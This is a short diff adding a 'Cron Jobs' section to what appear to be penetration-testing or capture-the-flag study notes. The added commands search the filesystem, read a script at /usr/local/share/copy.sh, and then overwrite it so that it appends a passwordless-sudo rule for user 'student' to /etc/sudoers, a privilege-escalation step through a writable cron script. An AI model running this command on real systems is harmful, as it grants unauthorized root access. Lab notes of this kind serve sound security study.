@@ -322,10 +322,18 @@ set SHA512 true
 run
 ```
 
+## Cron Jobs 
+```
+find / -name file_message
+grep -nri "content" /
+ls -l /tmp/
+grep -nri "content" /usr
+ls -l /usr/local/share/copy.sh
+cat /usr/local/share/copy.sh
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
 
 
-
-
+```
 
 
 
